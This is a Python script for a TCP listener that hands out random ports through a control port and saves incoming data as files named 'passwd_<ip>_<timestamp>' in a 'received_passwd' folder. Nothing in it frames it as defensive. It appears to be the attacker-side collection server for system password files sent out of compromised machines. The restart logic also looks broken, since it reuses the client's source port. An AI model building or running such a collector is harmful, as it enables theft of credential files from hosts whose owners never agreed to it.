import socket
import threading
import os
from datetime import datetime
import random

CONTROL_PORT = 50000  # Static control port for querying available ports
assigned_ports = set()
servers = []

def handle_client_connection(client_socket, addr):
    try:
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        ip = addr[0].replace('.', '_')
        filename = f"received_passwd/passwd_{ip}_{timestamp}.txt"
        with open(filename, 'wb') as f:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                f.write(data)
        print(f"Saved passwd file to {filename}")
    finally:
        client_socket.close()
        # Restart the server to accept new connections
        start_listening(addr[1])

def handle_control_connection(control_socket):
    try:
        data = control_socket.recv(4096).decode()
        if data == "REQUEST_PORT":
            new_port = assign_new_port()
            control_socket.send(f"{new_port}".encode())
        else:
            control_socket.send("INVALID_REQUEST".encode())
    finally:
        control_socket.close()

def assign_new_port():
    while True:
        port = random.randint(30000, 40000)
        if port not in assigned_ports:
            assigned_ports.add(port)
            start_listening(port)
            return port

def start_listening(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    servers.append(server)
    print(f"Listening on 0.0.0.0:{port}")

    # Save the new port to the file
    with open('ports.txt', 'a') as f:
        f.write(f"{port}\n")

    def accept_connections():
        while True:
            client_socket, addr = server.accept()
            print(f"Accepted connection from {addr} on port {port}")
            client_handler = threading.Thread(
                target=handle_client_connection,
                args=(client_socket, addr)
            )
            client_handler.start()

    threading.Thread(target=accept_connections).start()

def control_listener():
    control_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    control_server.bind(('0.0.0.0', CONTROL_PORT))
    control_server.listen(5)
    print(f"Control listener on 0.0.0.0:{CONTROL_PORT}")
    while True:
        control_socket, addr = control_server.accept()
        print(f"Control connection from {addr}")
        control_handler = threading.Thread(target=handle_control_connection, args=(control_socket,))
        control_handler.start()

def start_listener(storage_dir='./received_passwd'):
    if not os.path.exists(storage_dir):
        os.makedirs(storage_dir)

    threading.Thread(target=control_listener).start()

if __name__ == '__main__':
    start_listener()
